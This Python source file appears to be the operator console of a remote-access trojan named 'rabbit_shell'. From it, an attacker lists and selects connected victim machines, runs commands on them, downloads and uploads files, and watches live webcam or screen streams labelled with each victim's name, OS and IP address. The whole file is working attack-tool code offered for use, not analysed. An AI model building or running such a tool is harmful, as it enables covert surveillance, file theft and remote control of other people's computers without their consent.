import pickle
import threading

from rabbit_shell.controller import client_side, server_side
from rabbit_shell.data import data, basic
from rabbit_shell.background import backstuff
from rabbit_shell.data.banners import banner
import cv2
filetrans = server_side.filetrans()
client_side = client_side.client_side()
server_side = server_side.server_side()

class Auther:

    def __init__(self, host: str, port: int, key: str):

        self.key = key

        self.port = port
        self.host = host

        self.index = None
        self.stream = False
        self.stream_server = client_side.formate_socket()
        self.server = client_side.formate_socket()

        self.filetrans_server = client_side.formate_socket()

        self.input_mode = data.INPUT_MODE


    def connect(self, key, host, port):


        client_side.connect(self.server, host, port)

        key = f"root:{key}"

        logdata = {
            "key": key
        }

        self.server.send(pickle.dumps(logdata))

    def connect_tofiletrans(self, host, port):
        """
        host arg and port from main fun

        """
        return client_side.connect(self.filetrans_server, host, port)

    def connect_tostream(self, host, port):

        client_side.connect(self.stream_server, host, port)
        key = f"root:{basic.KEY}"

        logdata = {
            "key": key
        }
        return self.stream_server.send(pickle.dumps(logdata))

    def send(self, server, index, dt):

        ls = [index, dt]

        dt = pickle.dumps(ls)

        return server.send(dt)

    def response(self, server):
        while True:
            resp = server.recv(data.BUFFER_SIZE)

            return pickle.loads(resp)

    def filetrans_recv(self):

        try:

            res = self.filetrans_server.recv(data.BUFFER_SIZE)
            client_side.filetrans_recv(response=res)
            """
            when file is received it goes to
            the process of building it

            """
        except:
            """

            :except if there was exception it'll just continue \ new round of the loop
            mostly of server timeout

            """

    def stream_handle(self):

        while True:

            dt = self.stream_server.recv(data.BUFFER_SIZE)
            try:
                dt = pickle.loads(dt)
            except:
                continue

            frame = dt["frame"]
            address = dt["payload"]["ip"]
            name = dt["payload"]["name"]
            os = dt["payload"]["os"]
            if self.stream:

                cv2.imshow(f"name: ({name}) os: ({os}) address: {address}", cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
            elif not self.stream:
                cv2.destroyAllWindows()
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        cv2.waitKey(0)

        cv2.destroyAllWindows()


    def runtime(self):
        """

        connect to main server
        connect to filetrans server

        """
        self.connect(self.key, self.host, self.port)
        self.connect_tostream(self.host, self.port - data.CAM_FRAME_PORT)
        self.connect_tofiletrans(self.host, self.port - data.FILETRANS_PORT)
        threading.Thread(target=self.stream_handle).start()

        while True:


            command = input(self.input_mode)




            if command[:len(data.SET_CLIENT)] == data.SET_CLIENT:
                self.index = int(command.split()[1])
                self.send(self.server, self.index, data.PATHPING)
                input_mode, resp = self.response(self.server)
                if len(input_mode) > 2:
                    self.input_mode = input_mode
                if len(resp) != 0:
                    print(resp)



            else:
                if command == data.QUIT:
                    self.input_mode = data.INPUT_MODE
                    self.index = None
                elif len(command) != 0:

                    if command == "stream:cam":
                        self.stream = True

                    elif command == "stream:screen":
                        self.stream = True

                    elif command == "stream:stop":
                        self.stream = False

                    self.send(self.server, self.index, command)


                    if command == data.LIST_CLIENTS:
                        _ , table = self.response(self.server)
                        print(table)

                    elif command == "key":
                        print(self.key)


                    elif command[:8] == data.FILE_REQUEST:



                        self.send(self.server, self.index, command)
                        _, byte = self.response(self.server)

                        with open(command[8:], "wb") as file:
                            file.write(byte)
                            file.flush()
                            file.close()
                        print(f"received: {command[8:]}")




                    elif command[:len(data.SEND_FILE)] == data.SEND_FILE:

                        with open(command[len(data.SEND_FILE):], "rb") as file:

                            byte = file.read()
                            file.close()
                        ls = [command[len(data.SEND_FILE):], byte]
                        dt = pickle.dumps(ls)
                        self.filetrans_server.send(dt)
                        print(f"sent {command[len(data.SEND_FILE):]}")


                    elif command == data.BANNER_CLEAR:
                        backstuff.clear()
                        BANNER = banner.main_banner()
                        print(BANNER)


                    elif command in data.CLEAR:
                        backstuff.clear()




                    elif command == data.SERVERINFO:
                        dt = backstuff.server_info()
                        print(dt)


                    else:

                        input_mode, resp = self.response(self.server)
                        if len(input_mode) > 2:
                            self.input_mode = input_mode
                        if len(resp) != 0:
                            print(resp)


if "__main__" == __name__:
    auth = Auther(basic.HOST, int(basic.PORT), basic.KEY)
    auth.runtime()